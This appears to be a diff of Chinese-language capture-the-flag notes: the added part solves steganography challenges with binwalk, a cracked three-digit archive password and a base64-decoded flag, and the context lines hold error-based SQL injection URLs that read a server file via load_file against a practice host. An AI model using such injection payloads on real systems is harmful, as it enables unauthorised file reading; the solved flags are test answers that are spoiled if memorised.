@@ -1798,3 +1798,53 @@ http://103.238.227.13:10088/?id=1%0Aand%0aextractvalue(1,concat(0x7e,(select%0a@
 http://103.238.227.13:10088/?id=1%0aand%0a(extractvalue(1,concat(0x7e,substr(hex(load_file(0x2f7661722f746573742f6b65795f312e706870))%0afrom%0a161%0afor%0a20),0x7e)))
 
 
+=======================
+隐写2
+=======================
+
+..\binwalk  -e Welcome_.jpg
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             JPEG image data, JFIF standard 1.01
+30            0x1E            TIFF image data, big-endian, offset of first image directory: 8
+52516         0xCD24          Zip archive data, at least v1.0 to extract, compressed size: 6732, uncompressed size: 6732, name: flag.rar
+59264         0xE780          End of Zip archive, footer length: 22
+147852        0x2418C         End of Zip archive, footer length: 22
+
+分离一个压缩文件 cd24.zip
+
+打开 有 flag.rar ，需要密码打开 提示 3位数字
+用 archrp 破解 871
+用winhex打开图形文件
+ f1@g{eTB1IEFyZSBhIGhAY2tlciE=}
+
+
+ f1@g{eTB1IEFyZSBhIGhAY2tlciE=}
+
+python -c "import base64; print base64.b64decode('eTB1IEFyZSBhIGhAY2tlciE=')"
+y0u Are a h@cker!
+flag{y0u Are a h@cker!}
+
+注意flag 小写
+
+===========================
+又一张图片，还单纯吗
+===========================
+..\binwalk 2.jpg
+* suggest: you'd better to input the parameters enclosed in double quotes.
+* made by pcat
+* ***********************************************************************
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             JPEG image data, EXIF standard
+12            0xC             TIFF image data, big-endian, offset of first image directory: 8
+5555          0x15B3          LZMA compressed data, properties: 0x6D, dictionary size: 0 bytes, uncompressed size: 1702129225 bytes
+6133          0x17F5          LZMA compressed data, properties: 0x6D, dictionary size: 0 bytes, uncompressed size: 1934649168 bytes
+158792        0x26C48         JPEG image data, JFIF standard 1.02
+158822        0x26C66         TIFF image data, big-endian, offset of first image directory: 8
+159124        0x26D94         JPEG image data, JFIF standard 1.02
+162196        0x27994         JPEG image data, JFIF standard 1.02
+168370        0x291B2         Copyright string: "Copyright (c) 1998 Hewlett-Packard Company"
+
